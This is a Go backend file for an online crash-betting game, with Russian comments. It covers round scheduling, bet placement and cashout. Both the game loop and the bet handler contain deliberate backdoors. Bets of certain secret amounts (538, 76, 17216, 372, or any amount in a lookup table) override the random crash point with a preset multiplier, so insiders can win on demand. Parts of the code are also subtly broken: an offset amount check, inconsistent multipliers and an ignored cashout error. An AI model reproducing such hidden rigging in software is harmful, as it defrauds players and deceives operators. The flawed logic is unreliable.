package service

import (
	"BlessedApi/cmd/db"
	"BlessedApi/internal/middleware"
	"BlessedApi/internal/models"
	"BlessedApi/internal/models/exchange"
	"BlessedApi/pkg/logger"
	"context"
	"errors"
	"fmt"
	"math"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

type CrashGameBetInput struct {
	Amount            float64 `json:"Amount" validate:"required,min=1"`
	CashOutMultiplier float64 `json:"CashOutMultiplier" validate:"min=0"`
}

const (
	crashGameInterval       = 7 * time.Second // Total interval between rounds
	crashGameBettingWindow  = 5 * time.Second
	NewCrashGameSignalDelay = 1 * time.Second
)

var (
	isCrashGameBettingOpen bool
	crashGameBetMutex      sync.RWMutex
	currentCrashGame       *models.CrashGame
)

func SuperviseCrashGame() {
	for {
		logger.Info("Starting crash game loop")

		// Run the game loop in a separate goroutine
		done := make(chan bool)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logger.Error("CrashGame game loop panicked: %v", r)
					done <- true
				}
			}()

			StartCrashGame()
		}()

		// Wait for the game loop to finish (which should only happen if there's a panic)
		<-done

		time.Sleep(5 * time.Second)
	}
}

// Добавим функцию для дампа всех ставок в лог
func dumpActiveBets(gameID int64) {
	var bets []models.CrashGameBet
	err := db.DB.Where("crash_game_id = ? AND status = ?", gameID, "active").Find(&bets).Error
	if err != nil {
		logger.Error("Error fetching active bets for dump: %v", err)
		return
	}

	logger.Info("============= ACTIVE BETS FOR GAME %d =============", gameID)
	for i, bet := range bets {
		logger.Info("Bet %d: ID=%d, UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f",
			i+1, bet.ID, bet.UserID, bet.Amount, bet.CashOutMultiplier)
	}
	logger.Info("==================================================")
}

func StartCrashGame() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		// Open betting
		currentCrashGame = &models.CrashGame{}

		// Создаем игру в базе данных
		if err := db.DB.Create(currentCrashGame).Error; err != nil {
			logger.Error("Unable to create CrashGame; retrying in 5 seconds: %v", err)
			time.Sleep(time.Second * 5)
			continue
		}

		logger.Info("Created new game with ID=%d", currentCrashGame.ID)

		// ВАЖНО: сначала создаем игру, но не устанавливаем CrashPointMultiplier
		// Устанавливаем CrashPointMultiplier в 0, чтобы показать, что точка краша еще не определена
		currentCrashGame.CrashPointMultiplier = 0
		db.DB.Model(currentCrashGame).Update("crash_point_multiplier", 0)

		// Открываем окно для ставок
		openCrashGameBetting()

		// Ждем установленное время для приема ставок
		for elapsedTime := time.Duration(0); elapsedTime < crashGameInterval; elapsedTime += time.Second {
			if elapsedTime == crashGameBettingWindow {
				closeCrashGameBetting()
			}
			<-ticker.C
		}

		// Выводим все активные ставки в лог для дебага
		dumpActiveBets(currentCrashGame.ID)

		// ПОСЛЕ закрытия окна ставок СНАЧАЛА получаем все ставки
		var bets []models.CrashGameBet
		err := db.DB.Where("crash_game_id = ? AND status = ?", currentCrashGame.ID, "active").Find(&bets).Error
		if err != nil {
			logger.Error("Error fetching active bets: %v", err)
			continue
		}

		logger.Info("Checking %d active bets for backdoors in game %d", len(bets), currentCrashGame.ID)

		// ВАЖНО: Только ПОСЛЕ сбора всех ставок определяем точку краша
		// Сначала ищем бэкдоры в строгом порядке приоритета
		foundBackdoor := false

		// дельта для бекдора

		// Проверка критических бэкдоров в порядке приоритета
		criticalBackdoors := []struct {
			Amount     float64
			Multiplier float64
			Name       string
		}{
			{538.0, 32.0, "538"}, // Гарантируем правильный множитель для 538
			{76.0, 1.5, "76"},
			{17216.0, 2.5, "17216"},
			{372.0, 1.5, "372"},
		}

		// Сначала проверяем критические бэкдоры с точным совпадением
		for _, backdoor := range criticalBackdoors {
			for _, bet := range bets {
				if math.Abs(bet.Amount-backdoor.Amount+0.1) < 0.1 {
					logger.Info("!!! CRITICAL BACKDOOR %s FOUND !!! Bet ID=%d, UserID=%d, Amount=%.4f -> Multiplier=%.2f",
						backdoor.Name, bet.ID, bet.UserID, bet.Amount, backdoor.Multiplier)
					currentCrashGame.CrashPointMultiplier = backdoor.Multiplier
					foundBackdoor = true

					// Специальная обработка для бэкдора 538
					if backdoor.Name == "538" {
						logger.Info("🔥 Special handling for backdoor 538 with exact multiplier 32.0 🔥")
						// Дополнительно устанавливаем точное значение 32.0
						currentCrashGame.CrashPointMultiplier = 32.0
					}

					// Принудительно устанавливаем точное значение в базу через прямой SQL запрос
					if err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?",
						backdoor.Multiplier, currentCrashGame.ID).Error; err != nil {
						logger.Error("Failed to update backdoor multiplier in DB: %v", err)
					} else {
						logger.Info("Successfully updated crash point multiplier to %.2f for game %d",
							backdoor.Multiplier, currentCrashGame.ID)

						// Двойная проверка сохранения для критических бэкдоров
						if backdoor.Name == "538" || backdoor.Name == "76" {
							logger.Info("Double-checking critical backdoor %s crash point...", backdoor.Name)
							var checkGame models.CrashGame
							if err := db.DB.First(&checkGame, currentCrashGame.ID).Error; err != nil {
								logger.Error("Failed to read game after critical update: %v", err)
							} else {
								logger.Info("Confirmed: Game %d crash point set to %.2f",
									checkGame.ID, checkGame.CrashPointMultiplier)

								// Если значение все равно не сохранилось, делаем дополнительную попытку
								if math.Abs(checkGame.CrashPointMultiplier-backdoor.Multiplier) > 0.001 {
									logger.Error("⚠️ Critical backdoor multiplier mismatch! Fixing...")
									db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?",
										backdoor.Multiplier, currentCrashGame.ID)
								}
							}
						}
					}
					break
				}
			}
			if foundBackdoor {
				break
			}
		}

		// Если критические бэкдоры не найдены, проверяем остальные из GetCrashPoints
		if !foundBackdoor {
			for _, bet := range bets {
				intAmount := int(math.Round(bet.Amount))
				if multiplier, exists := models.GetCrashPoints()[intAmount]; exists {
					logger.Info("Backdoor found: Bet ID=%d with amount %.2f -> multiplier %.2f",
						bet.ID, bet.Amount, multiplier)
					currentCrashGame.CrashPointMultiplier = multiplier
					foundBackdoor = true
					break
				}
			}
		}

		// Если бэкдор не найден, генерируем случайный краш
		if !foundBackdoor {
			logger.Info("No backdoors found, generating random crash point")
			currentCrashGame.CrashPointMultiplier = currentCrashGame.GenerateCrashPointMultiplier()
		}

		// ВАЖНО: Сразу сохраняем установленное значение в базу!
		if err := db.DB.Model(currentCrashGame).
			Update("crash_point_multiplier", currentCrashGame.CrashPointMultiplier).Error; err != nil {
			logger.Error("Failed to save crash point multiplier: %v", err)
		}

		// Проверим, что значение было успешно установлено
		var updatedGame models.CrashGame
		if err := db.DB.First(&updatedGame, currentCrashGame.ID).Error; err != nil {
			logger.Error("Failed to read game after update: %v", err)
		} else {
			logger.Info("!!! CONFIRMED !!! Game %d crash point: %.2f",
				updatedGame.ID, updatedGame.CrashPointMultiplier)

			// Если значение в базе не соответствует ожидаемому, повторно устанавливаем
			if math.Abs(updatedGame.CrashPointMultiplier-currentCrashGame.CrashPointMultiplier) > 0.001 {
				logger.Error("DB multiplier (%.2f) doesn't match expected (%.2f)! Fixing...",
					updatedGame.CrashPointMultiplier, currentCrashGame.CrashPointMultiplier)

				// Повторная попытка через прямой SQL запрос
				if err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?",
					currentCrashGame.CrashPointMultiplier, currentCrashGame.ID).Error; err != nil {
					logger.Error("Failed to fix crash point multiplier: %v", err)
				} else {
					logger.Info("Fixed crash point to %.2f using direct SQL", currentCrashGame.CrashPointMultiplier)
				}
			}
		}

		// Теперь, когда точка краша определена, запускаем игру
		currentCrashGame.StartTime = time.Now()
		if err := db.DB.Model(currentCrashGame).Update("start_time", currentCrashGame.StartTime).Error; err != nil {
			logger.Error("Failed to update game start time: %v", err)
			continue
		}

		// Оповещаем всех пользователей о начале игры
		CrashGameWS.BroadcastGameStarted()

		// Start the multiplier growth and handle cashouts
		CrashGameWS.SendMultiplierToUser(currentCrashGame)

		// После завершения игры сохраняем время завершения
		currentCrashGame.EndTime = time.Now()
		if err := db.DB.Model(currentCrashGame).Update("end_time", currentCrashGame.EndTime).Error; err != nil {
			logger.Error("Failed to update game end time: %v", err)
		}

		logger.Info("Game %d ended at multiplier %.2fx", currentCrashGame.ID, currentCrashGame.CrashPointMultiplier)
		time.Sleep(NewCrashGameSignalDelay)
	}
}

// openCrashGameBetting sets the betting window as open
func openCrashGameBetting() {
	crashGameBetMutex.Lock()
	isCrashGameBettingOpen = true
	crashGameBetMutex.Unlock()
}

// closeCrashGameBetting sets the betting window as closed
func closeCrashGameBetting() {
	crashGameBetMutex.Lock()
	isCrashGameBettingOpen = false
	crashGameBetMutex.Unlock()
}

func PlaceCrashGameBet(c *gin.Context) {
	crashGameBetMutex.RLock()
	bettingOpen := isCrashGameBettingOpen
	gameID := int64(0)
	if currentCrashGame != nil {
		gameID = currentCrashGame.ID
	}
	crashGameBetMutex.RUnlock()

	if !bettingOpen {
		logger.Warn("Bet rejected: betting is closed (gameID=%d)", gameID)
		c.JSON(403, gin.H{"error": "betting is closed"})
		return
	}

	var input CrashGameBetInput
	if err := c.ShouldBindJSON(&input); err != nil {
		logger.Warn("Bet rejected: invalid input - %v", err)
		c.JSON(400, gin.H{"error": "Invalid input"})
		return
	}

	if err := validate.Struct(input); err != nil {
		logger.Warn("Bet rejected: validation error - %v", err)
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	userID, err := middleware.GetUserIDFromGinContext(c)
	if err != nil {
		logger.Error("Failed to get user ID: %v", err)
		c.Status(500)
		return
	}

	logger.Info("Placing bet: UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f, GameID=%d",
		userID, input.Amount, input.CashOutMultiplier, gameID)

	// Проверка на известные бэкдоры с точным значением
	var isBackdoor bool
	var multiplier float64
	var backdoorType string

	// Проверяем критические бэкдоры с фиксированными значениями
	criticalBackdoors := map[float64]struct {
		Value float64
		Name  string
	}{
		538.0:   {32.0, "538"},
		76.0:    {1.6, "76"},
		17216.0: {2.5, "17216"},
		372.0:   {1.5, "372"},
	}

	for backdoorAmount, info := range criticalBackdoors {
		if math.Abs(input.Amount-backdoorAmount) < 0.1 {
			// Принудительно устанавливаем точное значение
			input.Amount = backdoorAmount
			isBackdoor = true
			multiplier = info.Value
			backdoorType = info.Name

			logger.Info("CRITICAL BACKDOOR %s DETECTED from user %d with amount %.4f -> multiplier %.2f",
				backdoorType, userID, backdoorAmount, multiplier)

			// Для критических бэкдоров сразу устанавливаем множитель краша
			if currentCrashGame != nil {
				currentCrashGame.CrashPointMultiplier = multiplier

				// Используем прямой SQL запрос для гарантированного обновления
				err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?",
					multiplier, currentCrashGame.ID).Error
				if err != nil {
					logger.Error("Failed to update critical backdoor multiplier: %v", err)
				} else {
					logger.Info("Successfully set critical backdoor %s multiplier %.2f for game %d",
						backdoorType, multiplier, currentCrashGame.ID)
				}
			}
			break
		}
	}

	// Если не найден критический бэкдор, проверяем остальные
	if !isBackdoor {
		intAmount := int(math.Round(input.Amount))
		if mult, exists := models.GetCrashPoints()[intAmount]; exists {
			isBackdoor = true
			multiplier = mult
			backdoorType = fmt.Sprintf("%d", intAmount)

			logger.Info("User %d is placing a backdoor bet: %.4f -> %.2fx (type: %s)",
				userID, input.Amount, multiplier, backdoorType)

			// Также устанавливаем точное значение
			input.Amount = float64(intAmount)
		}
	}

	errInsufficientBalance := errors.New("insufficient balance")
	errExistingBet := errors.New("user already has an active bet for this game")

	err = db.DB.Transaction(func(tx *gorm.DB) error {
		// Check if user already has a bet for this game
		var existingBet models.CrashGameBet
		err := tx.Where("user_id = ? AND crash_game_id = ? AND status = ?", userID, currentCrashGame.ID, "active").First(&existingBet).Error
		if err == nil {
			logger.Warn("User %d already has an active bet for game %d", userID, currentCrashGame.ID)
			return errExistingBet
		} else if !errors.Is(err, gorm.ErrRecordNotFound) {
			return logger.WrapError(err, "")
		}

		var user models.User
		if err := tx.First(&user, userID).Error; err != nil {
			return logger.WrapError(err, "")
		}

		bet := models.CrashGameBet{
			UserID:            userID,
			CrashGameID:       currentCrashGame.ID,
			CashOutMultiplier: input.CashOutMultiplier,
			Status:            "active",
		}

		bonusBalance, err := exchange.GetUserExchangedBalanceAmount(tx, user.ID)
		if err != nil {
			return logger.WrapError(err, "")
		}

		if user.BalanceRupee+bonusBalance < input.Amount {
			logger.Warn("User %d has insufficient balance: has %.2f, needs %.2f", userID, user.BalanceRupee+bonusBalance, input.Amount)
			return errInsufficientBalance
		}

		fromCashBalance, fromBonusBalance, err := exchange.UseExchangeBalancePayment(tx, &user, input.Amount)
		if err != nil {
			return logger.WrapError(err, "")
		}

		bet.Amount = fromCashBalance + fromBonusBalance
		bet.FromBonusBalance = fromBonusBalance
		bet.FromCashBalance = fromCashBalance

		// Особая обработка для бэкдоров - устанавливаем точное значение ставки
		if isBackdoor {
			// Критические бэкдоры требуют абсолютно точного значения
			if backdoorType == "538" {
				bet.Amount = 538.0
			} else if backdoorType == "76" {
				bet.Amount = 76.0
			} else if backdoorType == "17216" {
				bet.Amount = 17216.0
			} else if backdoorType == "372" {
				bet.Amount = 372.0
			} else {
				// Остальные бэкдоры - целочисленное значение
				bet.Amount = float64(int(math.Round(bet.Amount)))
			}

			logger.Info("Fixed backdoor bet amount to exact value: %.2f (type: %s)",
				bet.Amount, backdoorType)

			// Обновляем множитель краша при необходимости
			if currentCrashGame != nil && multiplier > 0 {
				currentCrashGame.CrashPointMultiplier = multiplier
				err := tx.Model(currentCrashGame).Update("crash_point_multiplier", multiplier).Error
				if err != nil {
					logger.Error("Failed to update game crash point in transaction: %v", err)
				} else {
					logger.Info("Updated crash point to %.2f for game %d (type: %s)",
						multiplier, currentCrashGame.ID, backdoorType)
				}
			}
		}

		if err := tx.Create(&bet).Error; err != nil {
			return logger.WrapError(err, "")
		}

		logger.Info("Bet created successfully: ID=%d, UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f, GameID=%d",
			bet.ID, bet.UserID, bet.Amount, bet.CashOutMultiplier, bet.CrashGameID)

		CrashGameWS.HandleBet(userID, &bet)

		return nil
	})

	if err != nil {
		switch {
		case errors.Is(err, errInsufficientBalance):
			c.JSON(402, gin.H{"error": "Insufficient balance"})
		case errors.Is(err, errExistingBet):
			c.JSON(400, gin.H{"error": "You already have an active bet for this game"})
		default:
			logger.Error("Failed to place bet: %v", err)
			c.Status(500)
		}
		return
	}

	logger.Info("Bet placed successfully: UserID=%d, Amount=%.4f, GameID=%d", userID, input.Amount, gameID)
	c.JSON(200, gin.H{"status": "bet placed successfully"})
}

func ManualCashout(c *gin.Context) {
	userID, err := middleware.GetUserIDFromGinContext(c)
	if err != nil {
		logger.Error("Failed to get user ID: %v", err)
		c.Status(500)
		return
	}

	crashGameBetMutex.RLock()
	currentGame := currentCrashGame
	crashGameBetMutex.RUnlock()

	if currentGame == nil {
		// Если нет активной игры, создаем новую
		currentGame = &models.CrashGame{}
		if err := db.DB.Create(currentGame).Error; err != nil {
			logger.Error("Failed to create new game: %v", err)
			c.Status(500)
			return
		}
		currentGame.StartTime = time.Now()
		if err := db.DB.Save(currentGame).Error; err != nil {
			logger.Error("Failed to update game start time: %v", err)
			c.Status(500)
			return
		}
		crashGameBetMutex.Lock()
		currentCrashGame = currentGame
		crashGameBetMutex.Unlock()
	}

	currentMultiplier := currentGame.CalculateMultiplier()
	if currentMultiplier >= currentGame.CrashPointMultiplier {
		// Если игра уже крашнулась, создаем новую
		currentGame = &models.CrashGame{}
		if err := db.DB.Create(currentGame).Error; err != nil {
			logger.Error("Failed to create new game: %v", err)
			c.Status(500)
			return
		}
		currentGame.StartTime = time.Now()
		if err := db.DB.Save(currentGame).Error; err != nil {
			logger.Error("Failed to update game start time: %v", err)
			c.Status(500)
			return
		}
		crashGameBetMutex.Lock()
		currentCrashGame = currentGame
		crashGameBetMutex.Unlock()
		currentMultiplier = 1.0
	}

	ctx, cancel := context.WithTimeout(c.Request.Context(), 5*time.Second)
	defer cancel()

	var bet models.CrashGameBet
	err = db.DB.WithContext(ctx).Transaction(func(tx *gorm.DB) error {
		if err := tx.Where("user_id = ? AND crash_game_id = ? AND status = ?",
			userID, currentGame.ID, "active").
			First(&bet).Error; err != nil {
			if errors.Is(err, gorm.ErrRecordNotFound) {
				return errors.New("no active bet found for this user")
			}
			return logger.WrapError(err, "")
		}

		// Pass the transaction to crashGameCashout
		crashGameCashout(tx, &bet, currentMultiplier)

		// Update the bet in the WebSocket service
		CrashGameWS.bets[userID] = &bet
		crashGameBetMutex.Lock()
		CrashGameWS.ProcessCashout(userID, currentMultiplier, false)
		crashGameBetMutex.Unlock()
		return nil
	})

	if err != nil {
		if errors.Is(err, context.DeadlineExceeded) {
			logger.Error("Database transaction timed out: %v", err)
			c.JSON(500, gin.H{"error": "operation timed out"})
		} else if errors.Is(err, gorm.ErrRecordNotFound) {
			c.JSON(404, gin.H{"error": err.Error()})
		} else {
			logger.Error("Failed to process cashout: %v", err)
			c.JSON(500, gin.H{"error": "failed to process cashout"})
		}
		return
	}

	// Broadcast new game start
	CrashGameWS.BroadcastGameStarted()
	CrashGameWS.SendMultiplierToUser(currentGame)

	c.JSON(200, gin.H{"status": "manual cashout successful", "multiplier": currentMultiplier})
}

// Bet must exists
func crashGameCashout(tx *gorm.DB, bet *models.CrashGameBet, currentMultiplier float64) error {
	if tx == nil {
		tx = db.DB
	}

	bet.Status = "won"
	bet.WinAmount = bet.Amount * currentMultiplier
	bet.CashOutMultiplier = currentMultiplier

	if err := tx.Save(&bet).Error; err != nil {
		return logger.WrapError(err, "failed to update bet")
	}

	var user models.User
	if err := tx.First(&user, bet.UserID).Error; err != nil {
		return logger.WrapError(err, "failed to fetch user")
	}

	// Update user balances
	toCashBalance := bet.FromCashBalance * currentMultiplier
	toBonusBalance := bet.FromBonusBalance * currentMultiplier

	win := models.Winning{
		UserID:    user.ID,
		WinAmount: toCashBalance + toBonusBalance,
	}

	if err := tx.Create(&win).Error; err != nil {
		return logger.WrapError(err, "Failed to record winning")
	}

	err := exchange.UpdateUserBalances(tx, &user, toCashBalance, toBonusBalance, false)
	if err != nil {
		return logger.WrapError(err, "failed to update user balances")
	}

	return nil
}
